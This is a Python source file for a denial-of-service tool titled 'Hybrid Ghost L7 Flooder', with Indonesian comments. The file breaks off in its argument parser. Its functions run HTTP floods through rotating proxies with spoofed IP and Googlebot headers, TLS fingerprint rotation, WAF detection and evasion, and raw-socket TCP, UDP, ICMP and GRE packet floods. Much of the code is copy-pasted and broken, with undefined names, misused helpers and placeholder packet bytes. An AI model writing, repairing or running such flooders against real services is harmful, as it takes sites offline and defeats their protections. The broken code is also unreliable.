import argparse
import asyncio
import random
import uuid
import time
import aiohttp
import httpx
import socket
import json
import base64
import hashlib
import collections
from rich import print
from colorama import Fore, Style, init
from tls_client import Session
from rich.live import Live
from rich.table import Table
from rich.console import Console
from urllib.parse import urlparse

init(autoreset=True)

# Internal list of user-agents for faster performance
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    # Tambahkan 1000+ user-agent real jika perlu
]

def generate_user_agent():
    return random.choice(USER_AGENTS)

# Function to generate random headers
def generate_headers(target, profile=None):
    header_presets = [
        lambda: {
            'User-Agent': generate_user_agent(),
            'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4)),
            'Referer': 'https://bing.com/search?q=' + str(uuid.uuid4()),
            'Cache-Control': 'no-cache',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        },
        lambda: {
            'User-Agent': generate_user_agent(),
            'X-Requested-With': 'XMLHttpRequest',
            'Connection': 'keep-alive'
        },
        lambda: {
            'User-Agent': "Googlebot/2.1 (+http://www.google.com/bot.html)",
            'From': 'googlebot(at)google.com'
        }
    ]

    headers = random.choice(header_presets)()
    headers = mutate_headers(headers, target)
    if profile:
        if profile == "seo":
            headers['User-Agent'] = "Googlebot/2.1"
        elif profile == "mobile":
            headers['User-Agent'] = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
    return headers

# Function to mutate headers for stealth
def mutate_headers(headers, target):
    parsed = urlparse(target)
    host = parsed.netloc
    headers['Host'] = host
    headers['X-Real-IP'] = '.'.join(str(random.randint(1, 254)) for _ in range(4))
    headers['X-Originating-IP'] = headers['X-Real-IP']
    headers['X-Forwarded-Proto'] = random.choice(['http', 'https'])
    headers['Alt-Svc'] = f"h3=\":{random.choice([443, 8443, 2096])}\""
    return headers

# Function to load proxies from string
def load_proxies(proxy_str):
    return [proxy.strip() for proxy in proxy_str.split(',')]

# Function to detect WAF
async def detect_waf(session, url):
    try:
        async with session.get(url) as res:
            headers = res.headers
            if 'cf-ray' in headers or 'server' in headers and 'cloudflare' in headers['server'].lower():
                print(Fore.YELLOW + "[!] Cloudflare Detected")
            elif 'akamai' in str(headers).lower():
                print(Fore.YELLOW + "[!] Akamai Detected")
            elif 'sucuri' in str(headers).lower():
                print(Fore.YELLOW + "[!] Sucuri Detected")
    except Exception:
        pass

# Function to validate proxies
async def validate_proxy(proxy):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("http://httpbin.org/ip", proxy=proxy, timeout=5) as res:
                return res.status == 200
    except:
        return False

# TLS Spoofing Function (Synchronous)
def tls_spoof_post_sync(url, headers, data):
    session = Session(client_identifier="chrome_112")
    session.headers.update(headers)
    return session.post(url, data=data)

# TLS Spoofing Function (Asynchronous)
async def tls_spoof_post(url, headers, data, client_identifier="chrome_112"):
    async with httpx.AsyncClient(verify=False, transport=custom_tls) as client:
        response = await client.post(url, headers=headers, data=data)
        return response

# Obfuscated Payload for Ghost Attack
def ghost_obfuscate_payload():
    raw = json.dumps({
        random.choice(['token','uid','auth']): uuid.uuid4().hex,
        "b64": base64.b64encode(uuid.uuid4().bytes).decode()
    })
    return raw

# Safe POST request with retry logic
async def safe_post(session, url, **kwargs):
    retry_queue = asyncio.Queue()
    for _ in range(3):
        try:
            return await session.post(url, **kwargs)
        except:
            await retry_queue.put((url, kwargs))
            await asyncio.sleep(0.2)
    while not retry_queue.empty():
        url, kwargs = await retry_queue.get()
        try:
            await session.post(url, **kwargs)
        except:
            pass

# Smart Flood Mutation
async def smart_flood_mutation(target, proxies, threads, use_tls=False):
    async with aiohttp.ClientSession() as session:
        def generate_payload():
            keys = ['param', 'data', 'info', 'token', 'ref', 'uid']
            key = random.choice(keys)
            return f'{{"{key}": "{uuid.uuid4()}"}}'

        async def http_flood():
            global total_requests
            while True:
                proxy = None
                for _ in range(3):
                    p = random.choice(proxies)
                    if await validate_proxy(p):
                        proxy = p
                        break
                if not proxy:
                    continue  # skip iteration
                headers = generate_headers(target)
                data = generate_payload()
                try:
                    start = time.time()
                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
                        status_code = post_response.status
                        latency = round((time.time() - start) * 1000)
                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                        if status_code == 403:
                            # Change User-Agent and payload parameters
                            headers['User-Agent'] = generate_user_agent()
                            data = json.dumps({'new_param': uuid.uuid4().hex})
                        elif status_code == 503:
                            # Retry and drop body
                            await asyncio.sleep(random.uniform(1, 5))
                            data = ''
                        elif status_code == 200:
                            # Increase rate and chain JSON
                            await asyncio.sleep(random.uniform(0.1, 0.5))
                            data = json.dumps({'chain': [data, {'extra': uuid.uuid4().hex}]})
                        if status_code < 400:
                            global proxy_success
                            proxy_success += 1
                        else:
                            global proxy_fail
                            proxy_fail += 1
                        total_requests += 1
                except Exception as e:
                    print(f"[red]Error: {str(e)}")

                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))

        tasks = [http_flood() for _ in range(threads)]
        await asyncio.gather(*tasks)

# Exploit-aware Chaining Mode
async def exploit_chaining_mode(target, proxies, threads, use_tls=False):
    async with aiohttp.ClientSession() as session:
        def generate_payload():
            return json.dumps({'key': uuid.uuid4().hex})

        async def http_flood():
            global total_requests
            while True:
                proxy = None
                for _ in range(3):
                    p = random.choice(proxies)
                    if await validate_proxy(p):
                        proxy = p
                        break
                if not proxy:
                    continue  # skip iteration
                headers = generate_headers(target)
                data = generate_payload()
                try:
                    # Stage 1: POST login
                    async with safe_post(session, f"{target}/login", headers=headers, data=data, proxy=proxy) as login_response:
                        if login_response.status != 200:
                            continue
                        # Stage 2: PUT /config/update
                        async with safe_post(session, f"{target}/config/update", headers=headers, data=data, proxy=proxy, method='PUT') as put_response:
                            if put_response.status != 200:
                                continue
                        # Stage 3: GET /admin/logs
                        async with session.get(f"{target}/admin/logs", headers=headers, proxy=proxy) as get_response:
                            status_code = get_response.status
                            latency = round((time.time() - start) * 1000)
                            print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                            if status_code < 400:
                                global proxy_success
                                proxy_success += 1
                            else:
                                global proxy_fail
                                proxy_fail += 1
                            total_requests += 1
                except Exception as e:
                    print(f"[red]Error: {str(e)}")

                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))

        tasks = [http_flood() for _ in range(threads)]
        await asyncio.gather(*tasks)

# Adaptive Ghost Mutation Engine
async def adaptive_ghost_mutation(target, proxies, threads, use_tls=False):
    async with aiohttp.ClientSession() as session:
        def generate_payload():
            return json.dumps({'key': uuid.uuid4().hex})

        async def http_flood():
            global total_requests
            request_count = 0
            while True:
                proxy = None
                for _ in range(3):
                    p = random.choice(proxies)
                    if await validate_proxy(p):
                        proxy = p
                        break
                if not proxy:
                    continue  # skip iteration
                headers = generate_headers(target)
                data = generate_payload()
                try:
                    start = time.time()
                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
                        status_code = post_response.status
                        latency = round((time.time() - start) * 1000)
                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                        if status_code < 400:
                            global proxy_success
                            proxy_success += 1
                        else:
                            global proxy_fail
                            proxy_fail += 1
                        total_requests += 1
                        request_count += 1
                        if request_count % 5 == 0:
                            # Re-encode payload every 5 requests
                            data = base64.b64encode(data.encode()).decode()
                            data = json.dumps({'nested': data})
                except Exception as e:
                    print(f"[red]Error: {str(e)}")

                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))

        tasks = [http_flood() for _ in range(threads)]
        await asyncio.gather(*tasks)

# AI-Bypass Header Synthesis
async def ai_bypass_header_synthesis(target, proxies, threads, use_tls=False):
    async with aiohttp.ClientSession() as session:
        def generate_payload():
            return json.dumps({'key': uuid.uuid4().hex})

        async def http_flood():
            global total_requests
            while True:
                proxy = None
                for _ in range(3):
                    p = random.choice(proxies)
                    if await validate_proxy(p):
                        proxy = p
                        break
                if not proxy:
                    continue  # skip iteration
                headers = generate_headers(target)
                data = generate_payload()
                try:
                    # Randomize headers
                    headers['User-Agent'] = random.choice(USER_AGENTS)
                    headers['Accept-Language'] = random.choice(['en-US', 'fr-FR', 'es-ES'])
                    headers['Sec-Fetch-Site'] = random.choice(['none', 'same-origin', 'same-site'])
                    headers['Sec-Fetch-Mode'] = random.choice(['navigate', 'same-origin', 'no-cors', 'cors'])
                    headers['Sec-Fetch-Dest'] = random.choice(['document', 'empty', 'image', 'script', 'style', 'font', 'report', 'object', 'embed'])
                    start = time.time()
                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
                        status_code = post_response.status
                        latency = round((time.time() - start) * 1000)
                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                        if status_code < 400:
                            global proxy_success
                            proxy_success += 1
                        else:
                            global proxy_fail
                            proxy_fail += 1
                        total_requests += 1
                except Exception as e:
                    print(f"[red]Error: {str(e)}")

                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))

        tasks = [http_flood() for _ in range(threads)]
        await asyncio.gather(*tasks)

# Real-Time Fingerprint Spoofer (TLS + JA3)
async def tls_fingerprint_rotate(target, proxies, threads, use_tls=False):
    async with aiohttp.ClientSession() as session:
        def generate_payload():
            return json.dumps({'key': uuid.uuid4().hex})

        async def http_flood():
            global total_requests
            while True:
                proxy = None
                for _ in range(3):
                    p = random.choice(proxies)
                    if await validate_proxy(p):
                        proxy = p
                        break
                if not proxy:
                    continue  # skip iteration
                headers = generate_headers(target)
                data = generate_payload()
                try:
                    # Rotate JA3 fingerprint
                    client_identifiers = ["chrome_112", "firefox_109", "safari_16", "edge_110"]
                    client_identifier = random.choice(client_identifiers)
                    async with tls_spoof_post(target, headers, data, client_identifier=client_identifier) as post_response:
                        status_code = post_response.status
                        latency = round((time.time() - start) * 1000)
                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                        if status_code < 400:
                            global proxy_success
                            proxy_success += 1
                        else:
                            global proxy_fail
                            proxy_fail += 1
                        total_requests += 1
                except Exception as e:
                    print(f"[red]Error: {str(e)}")

                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))

        tasks = [http_flood() for _ in range(threads)]
        await asyncio.gather(*tasks)

# Proxy Score Autobalancer
async def proxy_score_autobalancer(target, proxies, threads, use_tls=False):
    async with aiohttp.ClientSession() as session:
        def generate_payload():
            return json.dumps({'key': uuid.uuid4().hex})

        async def http_flood():
            global total_requests
            while True:
                proxy = None
                for _ in range(3):
                    p = random.choice(proxies)
                    if await validate_proxy(p):
                        proxy = p
                        break
                if not proxy:
                    continue  # skip iteration
                headers = generate_headers(target)
                data = generate_payload()
                try:
                    start = time.time()
                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
                        status_code = post_response.status
                        latency = round((time.time() - start) * 1000)
                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                        if status_code < 400:
                            global proxy_success
                            proxy_success += 1
                        else:
                            global proxy_fail
                            proxy_fail += 1
                        total_requests += 1
                        # Adjust intensity based on proxy performance
                        if latency > 500:
                            threads -= 1
                        else:
                            threads += 1
                except Exception as e:
                    print(f"[red]Error: {str(e)}")

                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))

        tasks = [http_flood() for _ in range(threads)]
        await asyncio.gather(*tasks)

# WAF Reaction Simulator
async def waf_reaction_simulator(target, proxies, threads, use_tls=False):
    async with aiohttp.ClientSession() as session:
        def generate_payload():
            return json.dumps({'key': uuid.uuid4().hex})

        async def http_flood():
            global total_requests
            while True:
                proxy = None
                for _ in range(3):
                    p = random.choice(proxies)
                    if await validate_proxy(p):
                        proxy = p
                        break
                if not proxy:
                    continue  # skip iteration
                headers = generate_headers(target)
                data = generate_payload()
                try:
                    start = time.time()
                    # Simulate OPTIONS, HEAD, POST chain
                    async with session.options(target, headers=headers, proxy=proxy) as options_response:
                        if options_response.status != 200:
                            continue
                    async with session.head(target, headers=headers, proxy=proxy) as head_response:
                        if head_response.status != 200:
                            continue
                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
                        status_code = post_response.status
                        latency = round((time.time() - start) * 1000)
                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                        if status_code < 400:
                            global proxy_success
                            proxy_success += 1
                        else:
                            global proxy_fail
                            proxy_fail += 1
                        total_requests += 1
                except Exception as e:
                    print(f"[red]Error: {str(e)}")

                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))

        tasks = [http_flood() for _ in range(threads)]
        await asyncio.gather(*tasks)

# Attack Log Replay
async def attack_log_replay(target, proxies, threads, use_tls, replay_mode):
    async with aiohttp.ClientSession() as session:
        def load_logged_payloads(file_path):
            with open(file_path, 'r') as file:
                return [json.loads(line) for line in file]

        logged_payloads = load_logged_payloads('successful_payloads.log')

        async def http_flood():
            global total_requests
            while True:
                proxy = None
                for _ in range(3):
                    p = random.choice(proxies)
                    if await validate_proxy(p):
                        proxy = p
                        break
                if not proxy:
                    continue  # skip iteration
                payload = random.choice(logged_payloads)
                headers = generate_headers(target)
                data = payload['data']
                try:
                    start = time.time()
                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
                        status_code = post_response.status
                        latency = round((time.time() - start) * 1000)
                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                        if status_code < 400:
                            global proxy_success
                            proxy_success += 1
                        else:
                            global proxy_fail
                            proxy_fail += 1
                        total_requests += 1
                except Exception as e:
                    print(f"[red]Error: {str(e)}")

                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))

        tasks = [http_flood() for _ in range(threads)]
        await asyncio.gather(*tasks)

# Timed Chainer
async def timed_chainer(target, proxies, threads, use_tls=False):
    async with aiohttp.ClientSession() as session:
        def generate_payload():
            return json.dumps({'key': uuid.uuid4().hex})

        async def http_flood():
            global total_requests
            while True:
                proxy = None
                for _ in range(3):
                    p = random.choice(proxies)
                    if await validate_proxy(p):
                        proxy = p
                        break
                if not proxy:
                    continue  # skip iteration
                headers = generate_headers(target)
                data = generate_payload()
                try:
                    start = time.time()
                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
                        status_code = post_response.status
                        latency = round((time.time() - start) * 1000)
                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                        if status_code < 400:
                            global proxy_success
                            proxy_success += 1
                        else:
                            global proxy_fail
                            proxy_fail += 1
                        total_requests += 1
                        # Chain requests based on time intervals
                        await asyncio.sleep(random.uniform(0.1, 0.5))
                except Exception as e:
                    print(f"[red]Error: {str(e)}")

                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))

        tasks = [http_flood() for _ in range(threads)]
        await asyncio.gather(*tasks)

# L7L4 Blend
async def l7l4_blend(target, proxies, threads, use_tls=False):
    async with aiohttp.ClientSession() as session:
        def generate_payload():
            return json.dumps({'key': uuid.uuid4().hex})

        async def http_flood():
            global total_requests
            while True:
                proxy = None
                for _ in range(3):
                    p = random.choice(proxies)
                    if await validate_proxy(p):
                        proxy = p
                        break
                if not proxy:
                    continue  # skip iteration
                headers = generate_headers(target)
                data = generate_payload()
                try:
                    start = time.time()
                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
                        status_code = post_response.status
                        latency = round((time.time() - start) * 1000)
                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                        if status_code < 400:
                            global proxy_success
                            proxy_success += 1
                        else:
                            global proxy_fail
                            proxy_fail += 1
                        total_requests += 1
                        # Randomly inject raw packet flood
                        if random.choice([True, False]):
                            await raw_packet_flood(target, 10)
                except Exception as e:
                    print(f"[red]Error: {str(e)}")

                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))

        tasks = [http_flood() for _ in range(threads)]
        await asyncio.gather(*tasks)

# Raw Packet Flood (L3)
async def raw_packet_flood(target, threads):
    def generate_raw_packet():
        ip_header = b'\x45\x00\x00\x28'  # IP header (example)
        tcp_header = b'\x50\x00\x00\x00'  # TCP header (example)
        payload = b'\x00' * 100  # Dummy payload
        return ip_header + tcp_header + payload

    async def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        while True:
            packet = generate_raw_packet()
            sock.sendto(packet, (target, 0))
            await asyncio.sleep(0.01)

    tasks = [flood() for _ in range(threads)]
    await asyncio.gather(*tasks)

# IP Fragmentation Exploit (L3)
async def ip_fragmentation_exploit(target, threads):
    def generate_fragmented_packet(offset):
        ip_header = b'\x45\x00\x00\x28'  # IP header (example)
        tcp_header = b'\x50\x00\x00\x00'  # TCP header (example)
        payload = b'\x00' * 100  # Dummy payload
        return ip_header + tcp_header + payload[offset:]

    async def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        while True:
            for offset in range(0, 100, 10):
                packet = generate_fragmented_packet(offset)
                sock.sendto(packet, (target, 0))
                await asyncio.sleep(0.01)

    tasks = [flood() for _ in range(threads)]
    await asyncio.gather(*tasks)

# ICMP Fragment Flood (L3)
async def icmp_fragment_flood(target, threads):
    def generate_icmp_packet(offset):
        icmp_header = b'\x08\x00' + (b'\x00' * 2)  # ICMP header (example)
        payload = b'\x00' * 100  # Dummy payload
        return icmp_header + payload[offset:]

    async def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        while True:
            for offset in range(0, 100, 10):
                packet = generate_icmp_packet(offset)
                sock.sendto(packet, (target, 1))
                await asyncio.sleep(0.01)

    tasks = [flood() for _ in range(threads)]
    await asyncio.gather(*tasks)

# GRE Amplification (L3)
async def gre_amplification(target, threads):
    def generate_gre_packet():
        gre_header = b'\xFF\xFF'  # GRE header (example)
        payload = b'\x00' * 100  # Dummy payload
        return gre_header + payload

    async def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_GRE)
        while True:
            packet = generate_gre_packet()
            sock.sendto(packet, (target, 0))
            await asyncio.sleep(0.01)

    tasks = [flood() for _ in range(threads)]
    await asyncio.gather(*tasks)

# TCP ACK Flood (L4)
async def tcp_ack_flood(target, threads):
    def generate_tcp_ack_packet():
        ip_header = b'\x45\x00\x00\x28'  # IP header (example)
        tcp_header = b'\x50\x00\x00\x00'  # TCP header (example)
        return ip_header + tcp_header

    async def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        while True:
            packet = generate_tcp_ack_packet()
            sock.sendto(packet, (target, 0))
            await asyncio.sleep(0.01)

    tasks = [flood() for _ in range(threads)]
    await asyncio.gather(*tasks)

# TCP Xmas Tree Flood (L4)
async def tcp_xmas_tree_flood(target, threads):
    def generate_tcp_xmas_packet():
        ip_header = b'\x45\x00\x00\x28'  # IP header (example)
        tcp_header = b'\x50\x00\x00\x00\x01\x00\x00\x00'  # TCP header with flags set
        return ip_header + tcp_header

    async def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        while True:
            packet = generate_tcp_xmas_packet()
            sock.sendto(packet, (target, 0))
            await asyncio.sleep(0.01)

    tasks = [flood() for _ in range(threads)]
    await asyncio.gather(*tasks)

# UDP Protocol Exhaustion (L4)
async def udp_protocol_exhaustion(target, threads):
    def generate_udp_packet():
        ip_header = b'\x45\x00\x00\x28'  # IP header (example)
        udp_header = b'\x00\x00\x00\x00'  # UDP header (example)
        return ip_header + udp_header

    async def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        while True:
            packet = generate_udp_packet()
            sock.sendto(packet, (target, 0))
            await asyncio.sleep(0.01)

    tasks = [flood() for _ in range(threads)]
    await asyncio.gather(*tasks)

# TLS Handshake Exhaustion (L4)
async def tls_handshake_exhaustion(target, threads):
    def generate_tls_handshake_packet():
        ip_header = b'\x45\x00\x00\x28'  # IP header (example)
        tcp_header = b'\x50\x00\x00\x00'  # TCP header (example)
        tls_handshake = b'\x16\x03\x01\x00\x01\x00\x00'  # TLS handshake (example)
        return ip_header + tcp_header + tls_handshake

    async def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        while True:
            packet = generate_tls_handshake_packet()
            sock.sendto(packet, (target, 443))
            await asyncio.sleep(0.01)

    tasks = [flood() for _ in range(threads)]
    await asyncio.gather(*tasks)

# Dynamic Payload Mutation (L7)
async def dynamic_payload_mutation(target, proxies, threads, use_tls=False):
    async with aiohttp.ClientSession() as session:
        def generate_payload():
            return json.dumps({'key': uuid.uuid4().hex})

        async def http_flood():
            global total_requests
            while True:
                proxy = None
                for _ in range(3):
                    p = random.choice(proxies)
                    if await validate_proxy(p):
                        proxy = p
                        break
                if not proxy:
                    continue  # skip iteration
                headers = generate_headers(target)
                data = generate_payload()
                try:
                    start = time.time()
                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
                        status_code = post_response.status
                        latency = round((time.time() - start) * 1000)
                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                        if status_code < 400:
                            global proxy_success
                            proxy_success += 1
                        else:
                            global proxy_fail
                            proxy_fail += 1
                        total_requests += 1
                        # Mutate payload dynamically
                        data = base64.b64encode(data.encode()).decode()
                        data = json.dumps({'nested': data})
                except Exception as e:
                    print(f"[red]Error: {str(e)}")

                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))

        tasks = [http_flood() for _ in range(threads)]
        await asyncio.gather(*tasks)

# Header Overflow Exploit (L7)
async def header_overflow_exploit(target, proxies, threads, use_tls=False):
    async with aiohttp.ClientSession() as session:
        def generate_payload():
            return json.dumps({'key': uuid.uuid4().hex})

        async def http_flood():
            global total_requests
            while True:
                proxy = None
                for _ in range(3):
                    p = random.choice(proxies)
                    if await validate_proxy(p):
                        proxy = p
                        break
                if not proxy:
                    continue  # skip iteration
                headers = generate_headers(target)
                data = generate_payload()
                try:
                    start = time.time()
                    # Overflow headers
                    headers['Custom-Header'] = 'A' * 1000
                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
                        status_code = post_response.status
                        latency = round((time.time() - start) * 1000)
                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                        if status_code < 400:
                            global proxy_success
                            proxy_success += 1
                        else:
                            global proxy_fail
                            proxy_fail += 1
                        total_requests += 1
                except Exception as e:
                    print(f"[red]Error: {str(e)}")

                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))

        tasks = [http_flood() for _ in range(threads)]
        await asyncio.gather(*tasks)

# Cookie Logic Bombing (L7)
async def cookie_logic_bombing(target, proxies, threads, use_tls=False):
    async with aiohttp.ClientSession() as session:
        def generate_payload():
            return json.dumps({'key': uuid.uuid4().hex})

        async def http_flood():
            global total_requests
            while True:
                proxy = None
                for _ in range(3):
                    p = random.choice(proxies)
                    if await validate_proxy(p):
                        proxy = p
                        break
                if not proxy:
                    continue  # skip iteration
                headers = generate_headers(target)
                data = generate_payload()
                try:
                    start = time.time()
                    # Logic bomb in cookie
                    headers['Cookie'] = 'user=admin; path=/; httponly; secure; samesite=strict'
                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
                        status_code = post_response.status
                        latency = round((time.time() - start) * 1000)
                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                        if status_code < 400:
                            global proxy_success
                            proxy_success += 1
                        else:
                            global proxy_fail
                            proxy_fail += 1
                        total_requests += 1
                except Exception as e:
                    print(f"[red]Error: {str(e)}")

                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))

        tasks = [http_flood() for _ in range(threads)]
        await asyncio.gather(*tasks)

# Bypass JavaScript Challenge (L7)
async def bypass_javascript_challenge(target, proxies, threads, use_tls=False):
    async with aiohttp.ClientSession() as session:
        def generate_payload():
            return json.dumps({'key': uuid.uuid4().hex})

        async def http_flood():
            global total_requests
            while True:
                proxy = None
                for _ in range(3):
                    p = random.choice(proxies)
                    if await validate_proxy(p):
                        proxy = p
                        break
                if not proxy:
                    continue  # skip iteration
                headers = generate_headers(target)
                data = generate_payload()
                try:
                    start = time.time()
                    # Bypass JavaScript challenge
                    headers['X-Requested-With'] = 'XMLHttpRequest'
                    headers['Referer'] = target
                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
                        status_code = post_response.status
                        latency = round((time.time() - start) * 1000)
                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                        if status_code < 400:
                            global proxy_success
                            proxy_success += 1
                        else:
                            global proxy_fail
                            proxy_fail += 1
                        total_requests += 1
                except Exception as e:
                    print(f"[red]Error: {str(e)}")

                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))

        tasks = [http_flood() for _ in range(threads)]
        await asyncio.gather(*tasks)

# Recursive Path & Ref Exploit (L7)
async def recursive_path_ref_exploit(target, proxies, threads, use_tls=False):
    async with aiohttp.ClientSession() as session:
        def generate_payload():
            return json.dumps({'key': uuid.uuid4().hex})

        async def http_flood():
            global total_requests
            while True:
                proxy = None
                for _ in range(3):
                    p = random.choice(proxies)
                    if await validate_proxy(p):
                        proxy = p
                        break
                if not proxy:
                    continue  # skip iteration
                headers = generate_headers(target)
                data = generate_payload()
                try:
                    start = time.time()
                    # Recursive path and ref
                    target_path = f"{target}/recursive?ref={target}"
                    async with safe_post(session, target_path, headers=headers, data=data, proxy=proxy) as post_response:
                        status_code = post_response.status
                        latency = round((time.time() - start) * 1000)
                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                        if status_code < 400:
                            global proxy_success
                            proxy_success += 1
                        else:
                            global proxy_fail
                            proxy_fail += 1
                        total_requests += 1
                except Exception as e:
                    print(f"[red]Error: {str(e)}")

                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))

        tasks = [http_flood() for _ in range(threads)]
        await asyncio.gather(*tasks)

# Intelligent Async Socket Bomb (L7)
async def intelligent_async_socket_bomb(target, proxies, threads, use_tls=False):
    async with aiohttp.ClientSession() as session:
        def generate_payload():
            return json.dumps({'key': uuid.uuid4().hex})

        async def http_flood():
            global total_requests
            while True:
                proxy = None
                for _ in range(3):
                    p = random.choice(proxies)
                    if await validate_proxy(p):
                        proxy = p
                        break
                if not proxy:
                    continue  # skip iteration
                headers = generate_headers(target)
                data = generate_payload()
                try:
                    start = time.time()
                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
                        status_code = post_response.status
                        latency = round((time.time() - start) * 1000)
                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
                        if status_code < 400:
                            global proxy_success
                            proxy_success += 1
                        else:
                            global proxy_fail
                            proxy_fail += 1
                        total_requests += 1
                        # Intelligent socket bombing
                        if random.choice([True, False]):
                            await raw_packet_flood(target, 10)
                except Exception as e:
                    print(f"[red]Error: {str(e)}")

                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))

        tasks = [http_flood() for _ in range(threads)]
        await asyncio.gather(*tasks)

# Real-Time Status Tracker
async def real_time_status_tracker(threads, start_time, end_time):
    import time

    console = Console()
    with Live(console=console, refresh_per_second=2, screen=False) as live:
        while time.time() < end_time:
            table = Table(title="[ LIVE ]  ⚡️ Flood Monitor v1.0")
            table.add_column("🧩 Metric", style="cyan", no_wrap=True)
            table.add_column("📊 Value", style="magenta")

            # Handle nilai default dari variabel global
            success = proxy_success if 'proxy_success' in globals() else 0
            fail = proxy_fail if 'proxy_fail' in globals() else 0
            total = total_requests if 'total_requests' in globals() else 0
            code200 = status_codes.get(200, 0) if 'status_codes' in globals() else 0
            code403 = status_codes.get(403, 0) if 'status_codes' in globals() else 0
            code503 = status_codes.get(503, 0) if 'status_codes' in globals() else 0
            avg = round(average_rtt / total, 2) if total > 0 and 'average_rtt' in globals() else 0
            proxy_active = success + fail

            table.add_row("🛰️ Target", target)
            table.add_row("🧵 Threads", str(threads))
            table.add_row("🎯 Success", str(success))
            table.add_row("⛔️ Failed", str(fail))
            table.add_row("📡 Total Requests", str(total))
            table.add_row("🔁 Proxy Rotate", f"{proxy_active} aktif / {len(proxies)} total")
            table.add_row("⚙️ Status 200", str(code200))
            table.add_row("⚙️ Status 403", str(code403))
            table.add_row("⚙️ Status 503", str(code503))
            table.add_row("📡 Avg Latency", f"{avg} ms")
            table.add_row("📦 Payload Type", "chained_json" if success % 2 == 0 else "ghost_obf")
            table.add_row("🔁 Mutate UA", "On (GoogleBot Spoof)")

            live.update(table)
            await asyncio.sleep(1)

async def main( ):
    global proxy_success, proxy_fail, total_requests, status_codes, average_rtt

    proxy_success = 0
    proxy_fail = 0
    total_requests = 0
    status_codes = collections.Counter()
    average_rtt = 0

    parser = argparse.ArgumentParser(description="Hybrid Ghost L7 Flooder vFinal")
    parser.add_argument("target", help="Target URL (e.g. https://example.com)")
    parser.add_argument("--threads", type=int, default=50, help="Number of concurrent threads")
    parser.add_argument("--proxies", type=str, required=True, help="Comma-separated proxies (http://ip:port)")
    parser.add_argument("--tls", action="store_true", help="Enable TLS Spoofing mode")
    parser.add_argument("--smart-mutate", action="store_true", help="Enable Smart Flood Mutation")
    parser.add_argument("--exploit-chain-mode", action="store_true", help="Enable Exploit-aware Chaining Mode")
    parser.add_argument("--ghost-mutate-deep", action="store_true", help="Enable Adaptive Ghost Mutation Engine")
